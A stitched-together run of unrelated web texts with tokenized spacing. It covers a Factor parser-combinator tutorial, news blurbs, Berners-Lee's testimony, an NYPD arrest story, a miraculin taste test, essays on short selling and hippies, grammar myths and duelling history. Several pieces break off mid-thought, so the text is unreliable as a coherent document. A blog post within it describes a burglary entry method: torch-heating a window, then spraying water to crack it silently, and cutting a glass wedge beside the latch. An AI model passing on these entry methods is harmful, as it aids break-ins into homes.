These words do the same as ' < &>' but do n't put the result of one of the parsers in the parse tree .
The ' >' or ' < ' point to the parser that will have the result returned .
Here 's a new version that has a nicer parse tree using these words :
LAZY : ' expr2 ' ( -- parser ) ' lparens ' ' atom ' &> ' rparens ' <& ; " ( 123 ) " ' expr2 ' parse car parse - result - parsed . => 123
Notice the variants of ' < &>' used both select the result of the ' atom ' parser to be included in the parse tree and not the results of the parenthesis parsers .
There is still a problem with the expression parser .
It does n't handle more than one ' atom ' in the expression .
Similar to ' <+>' there is ' < >' which takes a parser and returns a new parser which when called parses zero or more instances of the original parser .
The parse tree for the result of ' < >' is an array of the results of the original parser :
LAZY : ' expr3 ' ( -- parser ) ' lparens ' ' atom ' sp <*> &> ' rparens ' <& ; " ( set a 123 ) " ' expr3 ' parse car parse - result - parsed . => { " set " " a " 123 }
This has one other change in that it needs to handle white space between atoms .
The ' sp ' word takes a parser ( in this case ' atom ' ) and returns a parser that first removes all white space from the start of the input string and then calls the original parser .
The effect is to produce a parser that ignores white space .
This gets close to what out test case requires but it returns an array not a quotation .
Using ' < @ ' fixes this :
LAZY : ' expr4 ' ( -- parser ) ' lparens ' ' atom ' sp <*> &> ' rparens ' <& [ > quotation ] <@ ; " ( set a 123 ) " ' expr4 ' parse car parse - result - parsed . => [ " set " " a " 123 ]
Unfortunately this fails on our second test case which requires handling nested expressions like '(+ 1 (+ 2 3 ) 4 ) ' .
By recursively calling the ' expr ' word this is easy to add :
LAZY : ' expr5 ' ( -- parser ) ' lparens ' ' atom ' ' expr5 ' < |> sp <*> &> ' rparens ' <& [ > quotation ] <@ ; " (+ 10 (+ 20 30 ) ) " ' expr5 ' parse car parse - result - parsed . => [ " + " 10 [ " + " 20 30 ] ]
This change was as simple as replacing the ' atom ' parser used between the two parenthesis with a parser which checks for an atom or an expression .
Note that this recursively calls itself , which is safe from infinite recursion due to the lazy evaluation .
It does n't actually get evaluated unless the ' atom ' test fails first .
One final change is to allow for only atoms as well as expressions and then our simple test cases work and it is completed :
LAZY : ' expr ' ( -- parser ) ' atom ' ' lparens ' ' atom ' ' expr ' < |> sp <*> &> ' rparens ' <& [ > quotation ] < @ < |> ; " ( set square ( lambda ( n ) (* n n ) ) ) " ' expr ' parse car parse - result - parsed . => [ " set " " square " [ " lambda " [ " n " ] [ " * " " n " " n " ] ] ] " 123 " ' expr ' parse car parse - result - parsed . => 123 " hello " ' expr ' parse car parse - result - parsed . => " hello "
These examples should work using the parser combinators code in the current Factor darcs repository and in the upcoming 0.85 release .
I 'm currently writing more documentation for the parser combinators and it will be accessable using the standard Factor help system .

In a " Factor Fiction " segment Wednesday night , Keith highlighted how Bill O'Reilly attacks MediaMatters for committing the mortal sin of quoting him accurately .
It 's hysterical how he seeks to discredit everything MM does when all they do is accurately document what he says .
It does n't matter if he actually said the quote in question ; what matters is if it was documented by MM .
If it was , then it 's immediately invalid -- even though they always include the entire context and video / audio .

Japanese TV news always shows the strangest things , and covers events in the strangest manner .
This FujiTV video ( 6 min40sec , English and Japanese subtitles ) vividly demonstrates the one thing that I find totally incomprehensible about Japanese news reportage .
The crime wave of home burglaries is a constant source of news coverage and analysis .
This story is about the recent arrest of a gang of burglars that used a novel technique to break in .
The method is called , a very interesting combination of two verbs , and , which both mean " to heat . "
The video actually shows thetechnique , first you heat the window for 20 seconds with a small butane torch .
Then you spray water on the hot spot , the window silently cracks into pieces .
The thief can gain silent entry rather than causing a commotion by smashing the glass .
And this is what I cannot understand about Japanese TV news .
In their reporting of the crime , they reenact the methods of the crime in such detail that it is practically an instructional video for criminals .
If you never knew how to break into a home , now you are an expert .
We see demonstrations in a glazier 's office , he prepares typical home windows and shows how easily they can be bypassed .
Then he shows another technique , using a glass cutter in a triangle pattern , a neat wedge is silently removed right next to the latch , just enough room for a finger to reach in and unlock the window .
The video uses a blur effect to conceal the precise movements of the glass cutter , but the methods are obvious despite the blurring .
The glazier finally shows a secure safety glass , which of course costs ten times what the typical window glass costs .
I am continually astonished at this type of news coverage .
I suppose they think this modus operandi is already common knowledge in Japan , so it is safe to let the public know how the thieves work .
But I still can't help thinking they are educating a whole new generation of criminals with these detailed demonstrations .
I 've only ever seen one similar incident in the USA .
When I lived in San Francisco , there was a rash of broken parking meters .
The local TV station investigated , and discovered some thieves were breaking into parking meters with an automotive dent puller and stealing the coins .
And then they demonstrated the actual technique on camera .
Within a week , there was not a single working parking meter in San Francisco .
The City had to replace every meter in the entire city at a huge expense , and boy were they hopping mad at the TV station .
They promised not to ever do anything like that again , but a few weeks later , they showed how to break bicycle locks with a car jack .
The same result : a crime wave of bicycle thefts .
I am also painfully conscious that this technique may not be widely known and I may be importinginto the US .
But that is ultimately FujiTV 's fault .
Or so I will keep telling myself .
" The web is like a white sheet that we 're holding up , " Sir Timothy Berners - Lee told a Congressional subcommittee this morning .
" And all these different systems are projecting onto it . "
That universality — the ability for disparate hardware , software , and languages to coexist in the same medium — has been one of the drivers of the web 's massive growth in the last decade , along with the availability of open and royalty - free standards that make such universality possible .
But , much like Tobey Maguire 's Spider - Man , Berners - Lee recognizes that with great power comes great responsibility .
Every important tool allows people to do both good and bad things , and the worldwide Internet community has seen plenty of both as the web has empowered both individual hackers and humanitarians in new ways .
As Congress considers regulations to crack down on such ills as copyright violations , Berners - Lee encourages them to first make it easy for people who want to do the right thing to be able to do so .
Passing laws , filing lawsuits , and tying up the court system is one way to deal with copyright issues , for instance , and such tools have their place .
But the first item of business for lawmakers and standards - makers is to make it simple for people to do the right thing .
Berners - Lee gave the example of better metadata for media files , arguing that such technology ought to make it simple to discover the licensing terms for any piece of media just by looking at the file .
Berners - Lee was in Washington to testify before the Subcommittee on Telecommunications and the Internet , chaired by Rep. Ed Markey ( D - MA ) .
As the subcommittee kicks off its two - year session , it first wanted to hear from the creator of the web to understand what made the web so successful in the first place .
It also wanted Berners - Lee 's thoughts about where the web was headed , which led to the comic scene of Berners - Lee try to explain the " semantic web " and the W3C " mobile web initiative " to a group of middle - aged representatives while interrupted by the insistent buzz of a House roll call announcement .
In their statements before testimony began , the assembled representatives laid out their concerns : child pornography , network neutrality , the future evolution of the web , and whether the web was being used as an excuse for more offline media consolidation .
Rep. Mike Doyle ( D - PA ) sounded less than thrilled with some of the doom - and - gloom scenarios put before the committee in the past , telling Berners - Lee that the web has become " the scapegoat of everyone who comes before this committee these days . "
In recapping the web 's brief history , Berners - Lee opened his testimony by describing the three essential features of the web as he saw them : universality , open standards , and the separation of layers .
All three points were variations on a single theme : open standards for general protocols allow for others to build astonishing innovations atop the foundation .
To illustrate his point , he talked about the controversy surrounding the rival Gopher protocol after the University of Minnesota began to license its own implementation , and users began to wonder if the university would seek a royalty from all implementations at some point down the road .
The future
In the future , Berners - Lee " hopes " ( he 's not a fan of prediction ) that two low - level developments will unleash a new flood of creativity .
The first is the " semantic web , " a model in which data can be linked , extracted , and reused across systems , even when those systems have not encountered such data before .
While the web works well with documents at the moment , it has not proved so adept at handling data formats ; semantic web technology should help with the problem .
This idea , which has been around for years at the W3C , has yet to make any significant headway .
Secondly , the rise of small , Internet - capable devices will bring connectivity to more people , especially in poor areas of the globe .
Because the screens on such devices are so small , Berners - Lee described his vision of wireless integration with large displays .
The idea here is that the mobile devices will function a bit like headless computers ; personal data and applications can be carried around in one 's pocket , then accessed and used at any location that provides a screen .
Berners - Lee did not call for any specific policy initiatives from Congress .
He did exhort them , in response to a question from Joe Barton ( R - TX ) , to remember that other committees just like this one were meeting in countries around the world and trying to work out difficult issues of applying local laws to globally - accessible servers .
The implied request seemed to be that Congress not assume that it needs to control the actions and laws of other countries , even when those laws allow Internet activity that is illegal in the US .
Whether that request will be honored remains to be seen .
I was working on a spreadsheet in Google Docs & Spreadsheets last night when I got this error message :
This is like the infamous Micorosft blue screen of death — the end of trust .

Apps has seamless , ultra-user - friendly offline support , it ’s simply not ready for prime time — and not to be trusted .
Joshua Kinberg 's internet - connected , sidewalk - printing graffiti bike got him a lot of attention ahead of the 2004 Republican National Convention ; he was Boing Boinged , Slashdotted and featured on CNN and in Popular Science .
Though he did n't know it at the time , his gadget also landed him a spot in secret files being compiled by the New York Police Department 's intelligence arm against protest groups across the country .
" The existence of these files show that there was a premeditated desire to prevent my project and arrest me to avoid having embarrassing messages on the streets during the convention , " Kinberg said .
Kinberg 's invention was a bicycle equipped with a line of spray cans pointed at the ground , and activated by individual computer - controlled solenoids .
If all had gone according to plan , Kinberg would have ridden the bicycle around the streets of New York during the RNC , while users submitted messages through his Bikes Against Bush website .
The messages would have been relayed to his laptop through a cell phone , then sprayed on the sidewalk behind him in a dot - matrix of water - soluble chalk .
But the New York Police Department had a different idea .
Though they 'd never seen him use the bike , the police arrested Kinberg on criminal mischief charges prior to the convention start , during an interview on Broadway Avenue with MSNBC 's Ron Reagan .
The arrest took place on a spot where , two days earlier , Kinberg had printed out the water - soluble message , " America is a free speech zone " during an interview with MSNBC's Countdown With Keith Olbermann .
Kinberg shows off his invention , a chalk - writing bicycle .

During his 24 hours in lockup , his bike was inspected and praised by bomb - squad technicians , while detectives traded Polaroids of his creation and members of the Joint Terrorism Task Force questioned whether he knew violent protesters .
Kinberg 's charges were later dropped , on the condition he not get arrested again for six months .
It was n't until December of last year that Kinberg learned his arrest was less spontaneous than it appeared .
He received a phone call from Gideon Oliver , an attorney enmeshed in a series of suits against the NYPD challenging the department 's mass arrests , fingerprinting policies and detention conditions .
Oliver revealed that Kinberg had been one of many targets of the NYPD 's " RNC Intelligence Squad , " which had been traveling around the country infiltrating progressive groups and building secret files on potential rabble - rousers ahead of the convention .
In late March , a New York Times reporter read Kinberg portions of his file .
" My project was all very public because I did n't want there to be any mystery as to what this was , " Kinberg told Wired News .
" The NYPD acted as the law enforcement arm of the Republican Party .
That 's not how this country is supposed to work . "
Commissioner Paul J. Brown , the NYPD 's chief spokesman , says the department did n't create dossiers on protesters , but merely issued reports on protesters ' plans .
He also said its infiltration of the groups complies with a long - standing court order known as the Handschu Consent Decree that limits NYPD 's surveillance of political groups .
" What we looked to do was prevent the kind of vandalism and violence that had occurred in Seattle and abroad , " Brown said .
Kinberg is arrested during an interview with MSNBC .

The bike project was Kinberg 's master 's thesis project ; he hoped to blanket New York City streets over a four - day period with citizen messages , positioned so that when viewed from above – by plotting the GPS coordinates – they would have spelled out the word vote .
Despite being released 24 hours after his arrest , Kinberg 's project was dead : both from fear of further arrest , and because the police kept everything – bike , laptop and cell phone – as evidence .
It was more than a year before Kinberg got back his cell phone , the chalk - based jet printer and an Apple laptop on which he was still making monthly payments .
Police say they still can't locate Kinberg 's bicycle , a 7 - foot - long extended bike donated to Kinberg by Xtracycle .
After graduating from Parsons The New School of Design with an MFA , Kinberg continued working with social media , joining a small but influential crew of people interested in citizen - created videos .
Now based in San Francisco , Kinberg is the CEO of social - media startup FireAnt .
He wonders whether to get involved in the lawsuits against the NYPD .
He wants to see his file , and he suspects , from a close examination of his videotaped arrest , that his arrest was planned by authorities eager to shut down legitimate protests .
The files are currently under a protective order , but the New York Civil Liberties Union is fighting to free many of them .
Kinberg says he worries that he's now on a government list that might get him in trouble the next time he crosses the border .
Brown says that 's not the case : " Of course we share information with the Joint Terrorism Task Force , but not about graffiti artists . "
Brown also said that concerns over profiling were overly broad , pointing out that millions were able to protest .
He says the aggressive intelligence operation prevented violent anarchist protests .
" Because of our police presence we learned about plans to target McDonald 's and Starbucks , and our increased visibility in those areas protected them , " Brown said .
While Brown said the intelligence documents were innocent , he added that the police do not want the court to release them because the information could reveal how the police department makes decisions .

Miraculin , the extract of a West African fruit , is said to make sour foods taste sweet .
It ’s not sugary , but it ’s said to trick your taste buds into misreporting the flavor of the food you ’re eating .
One of my students , Bill Zeller , bought some miraculin and a group of us tried it out .
Here , in the interest of science , is my report .
Miraculin is a lumpy powder , dull red in color , that results from freeze - drying the flesh of the so - called miracle fruit .
Here ’s about twenty - five grams of miraculin , with a lime for size comparison .
Bill bought fifty grams of miraculin , which came by mail from Ghana .
Both Ghana and the U.S. required customs paperwork before the fruit - based product could be shipped .
Here ’s the Republic of Ghana export permit .
I took a lump of miraculin , weighing a gram or two , and carefully ate it , pushing it around on my tongue as it dissolved .
It did n’t have much taste , and the texture was a bit gummy .
Once it was all dissolved I waited a minute or so for the effect to kick in .
The effect is said to wear off after about twenty minutes , so it was time for the taste test to begin .
As predicted , the miraculin made sour things taste sweet .
Lemon wedges tasted like sweet lemonade .
Lime wedges were sweet too .
I could still sense the acidity of the fruit , and there was a detectable sour taste but it seemed to be covered over with a pleasant citrus sweetness .
I could have eaten whole lemons or limes with no problem .
The grapefruit was stunning , perhaps the best - tasting fruit I have ever eaten .
The ones we had were pretty sweet already as grapefruit go , but with miraculin they were distinctly but not overly sweet , and the underlying grapefruit flavor came through beautifully .
I had to stop myself from wolfing down several grapefruit .
After the fruit I tried some other foods that were handy .
Pizza tasted about the same as usual , though the tomato sauce had a slightly sweet tinge .
Diet Dr. Pepper tasted normal .
I tried some Indian food – samosas and curried chickpeas – and found the flavor unchanged except that the spiciness was intensified .
The normally mild potato - based samosa filling had a spicy kick .
Miraculin did nothing for a sweet dessert .
My verdict on miraculin ?
It ’s pleasant and I ’m glad I tried it , but it ’s not a life - changing experience .
I can imagine it becoming popular .
It makes some healthy foods taste better , and it ’s not too expensive .
The amount I had would cost less than a dollar today if you bought in bulk , and there must be unexploited economies of scale .
Thanks to Bill Zeller for getting the miraculin ,
to my co-investigators ,
and Alex Halderman for taking the photos .

Stockholders and managers of firms , whose interests lie in higher prices for what they own or manage , miss few opportunities to deride short sellers .
As Holman Jenkins of the Wall Street Journal put it , " short selling is a business widely unpopular with everyone who has a stake in seeing stock prices go up . "
Regulators , whose blunders short sellers frequently reveal by discovering fraud that escaped their attention , respond similarly .
That combination of interests helps explain why , at various times , short selling has been banned in many countries , including England , France and Japan .
Such views are reinforced by accusations that short sellers hope for bad things to happen .
Others misplace the blame for the association between short selling and falling stock prices , especially in a " crisis . "
False comparisons , such as holding short sellers to a standard of perfect foresight , are also used to attack them .
However , all of these attacks are misguided .
Short selling is part of the information - revealing process that Mises , Hayek , and others emphasized as the central aspect and advantage of the market process .
In a world of uncertainty and change , information is the scarcest good , and short selling is an important source of additional information that would otherwise be lost .
Allowing short selling increases the number of people with an incentive to discover valuable information about firms ' prospects , by providing an added mechanism to benefit from information that turns out to be negative .
When someone 's research or information leads them to negative conclusions about a firm , short selling allows them to communicate their less optimistic expectations to others and make a profit if they anticipate the direction the market will later come to agree with .
That is , they profit only if they come to " correct " conclusions before others .
In the process , they benefit others by revealing accurate information sooner than would otherwise be the case , reducing the mistakes people would have made from relying on the less accurate prices that would otherwise exist .
Negative information may not be as valuable as positive information for purposes of cheerleading , but it is just as valuable when people wish to make the best use of scarce resources .
That is sometimes reflected in the observation that much of economics involves negative information — knowing some things not to do , rather than knowing what to do — especially in combating the trouble that arises from " knowing so much that ai n't so . "
There is no reason why information that might have negative implications for firms would only be revealed to or discovered by those who are already owners of a particular stock .
To attack or restrict short selling is then to restrict the market 's ability to elicit and integrate all available information .
Restrictions on short selling are analogous to a voting process where there are only the possibilities of voting yes ( owning shares ) or abstaining from voting ( current non-owners ) , but " no " votes ( selling what you do not own ) are impossible .
People can vote yes , buying shares and pushing up stock prices , or those who previously voted yes can decide to go back to abstaining by selling their shares , lowering stock prices .
But short sellers allow current abstainers to vote " no , " giving themselves the ability to benefit from their different views while benefiting others via market prices , without having to first own shares in a company .
Short selling , which allows profits to be made from negative information , is akin to another aspect of a competitive financial market — hostile corporate takeovers .
Management groups who fail to make the best use of their company 's assets object to the prospect out of their own self - interest .
But hostile takeovers provide a mechanism for even those investors who own no current shares in a firm to benefit from negative information .
If a firm is poorly run , even someone with no initial position in a company can purchase shares at a price capitalizing its prospects under current management .
By then accumulating enough shares , and taking over management , " takeover artists " can gain from eliminating inefficiencies and improving results .
This expands the number of potential investors who have incentives to discover such negatives and " fix " underperforming companies .
Short sellers have been portrayed as heartless opportunists , benefiting from bad outcomes .
But they are no different from doctors who profit from our illnesses , or teachers who benefit from our ignorance , or locksmiths who benefit from criminal acts .
Further , one 's belief that future reality is more negative than others believe it to be does not change that reality .
It simply conforms market beliefs more accurately to it , when short sellers are right — the only situation in which they can profit from their forecasts .
Revealing mistakes is socially beneficial , and a far cry from just hoping for bad outcomes ( just as parenting sometimes involves deflating children 's false hopes , not to harm them , but to help them make better choices ) .
What is called short selling in the stock market is common in all sorts of businesses .
A farmer who sells on a futures market when he plants , before he has produced his output , does the same thing .
So does a homebuilder or custom tool maker producing to order .
And that knowledge is hardly new .
As the 1909 New York State Commission on Speculation noted , " Contracts and agreements to sell , and deliver in the future , property which one does not possess at the time of the contract , are common in all kinds of business . "
There is no reason why a practice commonly accepted in business , which participants must therefore view as beneficial , is somehow harmful to those participating in the stock market .
Regulatory opposition also indicates the positive consequences of allowing short selling .
Regulatory agencies are supposed to prevent fraud , questionable accounting , and other management misbehavior .
However , they often fail not only to prevent , but even to detect them .
Short sellers who are betting their own money on being correct often uncover what regulators miss , as they did at Worldcom , Enron , Tyco , etc. , showing themselves as more effective market policemen .
Regulators then object precisely because their inadequacy is revealed .
In fact , their often ineffective regulatory oversight makes markets less efficient , by giving participants more confidence in stock promoters ' assertions than is warranted .
But they try to make short sellers into scapegoats , allowing regulators to leverage their failure into further expansion of their powers , to combat short selling 's supposed evils .
Opposition to short selling also confuses correlation with causation .
Selling short only lowers the price sooner than would otherwise occur .
It cannot force the price down for long if the fundamental circumstances do not support it .
Short sellers simply recognize negative information sooner .
Their activity can begin the process of reducing market prices , but it is the negative information that causes stock prices to fall .
And even when short sellers are wrong , they provide extra profit opportunities to those who expand their holdings at the temporarily low prices that result , a benefit ignored by those blinded by their exclusive devotion to " what 's in it for me ? "
Opposition to short selling is often no more than objecting to its effects on a particular stock the opponent currently owns .
The only principle involved is that of preventing any change that might lower the price of what one owns ( which is then over - generalized , as the Luddites ' opposition to losing their threatened jobs to printing presses was dressed up as principled opposition to technology in general ) , ignoring the benefits to society from revealing more accurate information .
Short sellers are also attacked for allegedly spreading negative rumors that sometimes turn out to be false .
But false positive rumors are regularly asserted by a far larger group who benefit by pumping up stock prices , from managers to brokers to financial talk show touts .
But critics of short selling are only concerned about what they do n't benefit from .
In addition , the consequences of all forms of potential misinformation are made more problematic by the belief that regulatory agencies actually protect investors from it , when they really do n't .
Without that unwarranted confidence , investors who knew to be wary , or to trust only those who had earned superior reputations that they would put at risk , would be more accurately informed than they are now .
Short sellers are also criticized whenever they are wrong .
But holding them to a standard of correct expectations is an impossible standard .
No one has perfect foresight .
People who buy stock are not always correct that it will go up thereafter .
And even if they were , those who sold the stock to them would have to have been wrong in their judgment .
Applying such a standard of perfection to short sellers alone is just a mechanism to attack them , not a serious idea .
Firms do not always stop their aversion to short sellers at negative attitudes .
They often directly attack them .
For instance , The Economist reported , " Not long before Tyco went bankrupt it was still buying full - page advertisements to campaign against short - selling . "
Similarly , within a month of Biovail filing suit against short sellers for expressing negative opinions about it , the SEC announced an investigation which led to a settlement involving serious fraud charges .
Perhaps most telling about the assaults on short selling is a 2004 NBER study that discussed the fact that " Firms use a variety of methods to impede short selling , including legal threats , investigations , lawsuits , and various technical actions . "
It revealed the high probability that firms attacking short sellers actually have something to hide , indicated by the fact that " firms taking anti-shorting actions have in the subsequent year very low abnormal returns of about - 2 percent per month . "
Short sellers receive widespread condemnation .
But it is undeserved .
They are no more self - interested than others in financial markets .
They improve the information incorporated in market prices that we all rely on to improve social coordination , as we seek to make the best of a world of unavoidable scarcity .
The attacks against them are poorly thought out , and often come from those whose real abuses or regulatory failings short sellers threaten to uncover .
It is time we stop selling short the short sellers .
The Hippies Were Right ! / Green homes ?
Organic food ?
Nature is good ?
Time to give the ol ' tie - dyers some respect
Go ahead , name your movement .
Name something good and positive and pro-environment and eco-friendly that 's happening right now in the newly " greening " America and do n't say more guns in Texas or fewer reproductive choices for women or endless vile unwinnable BushCo wars in the Middle East lasting until roughly 2075 because that would defeat the whole point of this perky little column and destroy its naive tone of happy rose - colored sardonic optimism .
OK ?
I 'm talking about , say , energy - efficient light bulbs .
I 'm looking at organic foods going mainstream .
I mean chemical - free cleaning products widely available at Target and I 'm talking saving the whales and protecting the dolphins and I mean yoga studios flourishing in every small town , giant boxes of organic cereal at Costco and non-phthalates dildos at Good Vibes and the Toyota Prius becoming the nation 's oddest status symbol .
You know , good things .
Look around : we have entire industries devoted to recycled paper , a new generation of cheap solar - power technology and an Oscar for " An Inconvenient Truth " and even the soulless corporate monsters over at famously heartless joints like Wal - Mart are now claiming that they really , really care about saving the environment because , well , " it 's the right thing to do " ( read :
It 's purely economic and all about their bottom line because if they do n't start caring they 'll soon be totally screwed on manufacturing and shipping costs at / from all their brutal Chinese sweatshops ) .
There is but one conclusion you can draw from the astonishing ( albeit fitful , bittersweet ) pro-environment sea change now happening in the culture and ( reluctantly , nervously ) in the halls of power in D.C. , one thing we must all acknowledge in our wary , jaded , globally warmed universe :
The hippies had it right all along .
Oh yes they did .
You know it 's true .
All this hot enthusiasm for healing the planet and eating whole foods and avoiding chemicals and working with nature and developing the self ?
Came from the hippies .
Alternative health ?
Hippies .
Green cotton ?
Hippies .
Reclaimed wood ?
Recycling ?
Humane treatment of animals ?
Medical pot ?
Alternative energy ?
Natural childbirth ?
Non-GMO seeds ?
It came from the granola types ( who , of course , absorbed much of it from ancient cultures ) , from the alternative worldviews , from the underground and the sidelines and from far off the goddamn grid and it's about time the media , the politicians , the culture as a whole sent out a big , wet , hemp - covered apology .
Here 's a suggestion , from one of my more astute ex-hippie readers : Instead of issuing carbon credits so industrial polluters can clear their collective corporate conscience , maybe , to help offset all the savage damage they 've done to the soul of the planet all these years , these commercial cretins should instead buy some karma credits from the former hippies themselves .
You know , from those who 've been working for the health of the planet , quite thanklessly , for the past 50 years and who have , as a result , built up quite a storehouse of good karma .
You think ?
Of course , you can easily argue that much of the " authentic " hippie ethos -- the anti-corporate ideology , the sexual liberation , the anarchy , the push for civil rights , the experimentation -- has been totally leeched out of all these new movements , that corporations have forcibly co-opted and diluted every single technology and humble pro-environment idea and Ben & Jerry 's ice cream cone and Odwalla smoothie to make them both palatable and profitable .
But does this somehow make the organic oils in that body lotion any more harmful ?
Verily , it does not .
You might also just as easily claim that much of the nation 's reluctant turn toward environmental health has little to do with the hippies per se , that it 's taking the threat of global meltdown combined with the notion of really , really expensive ski tickets to slap the nation 's incredibly obese ass into gear and force consumers to begin to wake up to the savage gluttony and wastefulness of American culture as everyone starts wondering , oh my God , what 's going to happen to swimming pools and NASCAR and free shipping from Amazon ?
Of course , without the '60s groundwork , without all the radical ideas and seeds of change planted nearly five decades ago , what we'd be turning to in our time of need would be a great deal more hopeless indeed .
But if you 're really bitter and shortsighted , you could say the entire hippie movement overall was just incredibly overrated , gets far too much cultural credit for far too little actual impact , was pretty much a giant excuse to slack off and enjoy dirty lazy responsibility - free sex romps and do a ton of drugs and avoid Vietnam and not bathe for a month and name your child Sunflower or Shiva Moon or Chakra Lennon Sapphire Bumblebee .
This is what 's called the reactionary simpleton 's view .
It blithely ignores history , perspective , the evolution of culture as a whole .
You know , just like America .
But , you know , whatever .
The proofs are easy enough to trace .
The core values and environmental groundwork laid by the '60s counterculture are still so intact and potent even the stiffest neocon Republican has to acknowledge their extant power .
It 's all right there : Treehugger.com is the new '60s underground hippy zine .
Ecstasy is the new LSD .
Visible tattoos are the new longhairs .
And bands as diverse as Pearl Jam to Bright Eyes to NIN to the Dixie Chicks are writing savage anti-Bush , anti-war songs for a new , ultra - jaded generation .
And oh yes , speaking of good ol ' MDMA ( Ecstasy ) , even drug culture is getting some new respect .
Staid old Time mag just ran a rather snide little story about the new studies being conducted by Harvard and the National Institute of Mental Health into the astonishing psychospiritual benefits of goodly entheogens such as LSD , psilocybin and MDMA .
Unfortunately , the piece basically backhands Timothy Leary and the entire " excessive , " " naive " drug culture of yore in favor of much more " sane " and " careful " scientific analysis happening now , as if the only valid methods for attaining knowledge and an understanding of spirit were through control groups and clinical , mysticism - free examination .
Please .
Still , the fact that serious scientific research into entheogens is being conducted even in the face of the most anti-science , pro-pharmaceutical , ultra - conservative presidential regime in recent history is proof enough that all the hoary old hippie mantras about expanding the mind and touching God through drugs were onto something after all ( yes , duh ) .
Tim Leary is probably smiling wildly right now -- though that might be due to all the mushrooms he 's been sharing with Kerouac and Einstein and Mary Magdalene .
Mmm , heaven .
Of course , true hippie values mean you 're not really supposed to care about or attach to any of this , you do n't give a damn for the hollow ego stroke of being right all along , for slapping the culture upside the head and saying , See ?
Do you see ?
It was never about the long hair and the folk music and Woodstock and taking so much acid you see Jesus and Shiva and Buddha tongue kissing in a hammock on the Dog Star , nimrods .
It was , always and forever , about connectedness .
It was about how we are all in this together .
It was about resisting the status quo and fighting tyrannical corporate / political power and it was about opening your consciousness and seeing new possibilities of how we can all live with something resembling actual respect for the planet , for alternative cultures , for each other .
You know , all that typical hippie crap no one believes in anymore .
Right ?

There are some myths in English grammar that people continue to believe and practise in their essay writing .
It is a dismal situation that most English users learn these English grammar myths from their teachers who do not bother to update themselves with the evolution in English .
Never split infinitives
“ To publicly critique someone you respect ” was considered a grammatical error in the past because an adverb ‘ publicly ’ is placed between ‘ to ’ and the verb .
Some professionals may still avoid it , but many publications regard it as acceptable .
Never use contractions in essay writing
Some English users believe that contractions should never be used in essay writing .
They believe that contractions like wo n’t , can ’t , should n’t etc should only be used in spoken English .
This is no longer true as more and more newspapers and publications are using contractions in the writing .
Never begin a sentence with ‘ and ’ , ‘ but ’ or ‘ because ’ ( conjunctions )
As English evolves , this is no longer true .
It is now acceptable to begin a sentence with ‘ and ’ , ‘ but ’ or ‘ because ’ .
People promoting this myth are either not reading newspapers or do not care to learn proper English .
Never begin the essay title with prepositions
It has become a writing style for essay writing to be entitled using prepositions like ‘ of ’ or ‘ on ’ .
Examples of essay titles that I came across just now were
- Of Professionals and Degrees
- On Kolej Universiti Teknikal Kebangsaan Malaysia ( KUTKM )
Never use first - person pronouns in academic writing
There is a superstitious notion that says never use first - person pronouns like ‘ I ’ and ‘ we ’ in essay writing because doing so will make your essay writing to look unprofessional .
Contrary to the notion , English writers are encouraged to use first - person pronouns to draw readers ’ attention and to put some life into your writing .
Corporate letters should use ‘ I ’ to personalise the letter and accept responsibility .
Never refer the readers as ‘ you ’
Copywriters will find this myth very funny .
Please take note that you can actually refer the readers as ‘ you ’ or ‘ we ’ to include yourselves .
However , you should be consistent in using either ‘ you ’ or ‘ we ’ throughout your essay writing .
Never use ‘ between ’ with more than two objects
This is a popular misconception among English beginner users .
While it is true that we use ‘ between ’ when comparing two objects , it is correct to use ‘ between ’ when more than two people or objects are involved .
Examples taken from Longman Dictionary of Contemporary English ( LDOCE ) :
Comparing two things :
In her book she makes a comparison between Russian and British ballet .
More than two people or objects :
- Tom divided his money between his children .
- Between the four of them they managed to lift her into the ambulance .
- We collected £ 17 between us .
Never use ‘ since ’ as because
There ’s a groundless notion that ‘ since ’ is only used to mean from a particular time or event in the past until the present , or in that period of time .
‘ Since ’ can actually be used to give the reason for something .
The following sentence taken from dictionary is grammatically correct .
- Since you are unable to answer , perhaps we should ask someone else .
Never use direct question
Using direct question in writing to arouse the readers ’ interest on certain topic has become an essay writing style .
When writing essay on smoking , for instance , you can include questions like ‘ what are the bad effects of smoking ? ’ and ‘ why people smoke ? ’ in your essay .
There are debates that direct question is not suitable for academic writing .
Two - syllable adjectives must use the suffix –er or suffix –est form to form comparative or superlative
E.g. prettier , prettiest ; gentler , gentlest ; narrower , narrowest .
Adding ‘ more ’ or ‘ most ’ to two - syllable adjectives to form comparative or superlative , however , is getting common and gaining ground in modern English .
E.g. more pretty , most pretty ; more gentle , most gentle ; more narrow , most narrow .

After all , the evolution of English is about ‘ spoken ’ style becoming acceptable as writing forms .
Duelling codes , though intended to curb violence , may only have ritualized it .
DAVID HUGHES
On the night of June 10 , 1804 , Alexander Hamilton seated himself at his desk in his home in upper Manhattan to finish a letter explaining why the following morning would find him in Weehawken , New Jersey , pointing a flintlock pistol at Vice - President Aaron Burr .
He began by listing five moral , religious , and practical objections to duelling , but ruefully concluded , seven paragraphs later , that “ what men of the world denominate honor ” made it impossible for him to “ decline the call . ”
Burr had placed him in an untenable position .
If Hamilton ignored the challenge , Burr would “ post ” him — that is , publish his refusal in the newspapers — and his political career would effectively be ruined .
The next morning , Hamilton had himself rowed across the Hudson .
“ If we were truly brave , we should not accept a challenge ; but we are all cowards , ” a friend of Hamilton ’s said after his death .
He was thinking not only of Hamilton but of all men in public life whose reputations were at the mercy of political rivals and incendiary journalism .
As Joanne B. Freeman makes plain in “ Affairs of Honor ” ( 2001 ) , Hamilton and Burr belonged to a class for whom no public offense could go unchallenged even if one felt no personal outrage .
Hamilton , too , had issued challenges and seconded other men— one way or another , he had been involved in more than ten “ affairs of honor ” — while Burr had been party to three duels , including one where he actually took the field .
Neither of them was an exception among the Founding Fathers .
Button Gwinnet , a signer of the Declaration of Independence , died of wounds received in a duel ; and James Monroe refrained from challenging John Adams only because Adams was President at the time .
Some years later , Andrew Jackson and Henry Clay took part in duels , and even the young Abraham Lincoln came very close to a sword fight with James Shields , a fellow - Illinoisan who eventually became a Union general .
Duelling is an anachronism , of course .
This is true because it may still crop up .
In 1954 , Ernest Hemingway was challenged to a duel in Cuba , but declined .
In 1967 , two French politicians literally crossed swords in Neuilly .
And four years ago a Peruvian legislator challenged his nation ’s Vice - President to meet him on a beach near Lima .
No one anticipates such shenanigans at Buckingham Palace , but the Queen , as it happens , still retains an official champion who stands ready to challenge anyone who disputes her sovereignty .
This rather daunting fact turns up in James Landale ’s “ The Last Duel : A True Story of Death and Honor ” ( Canongate ; $ 24 ) .
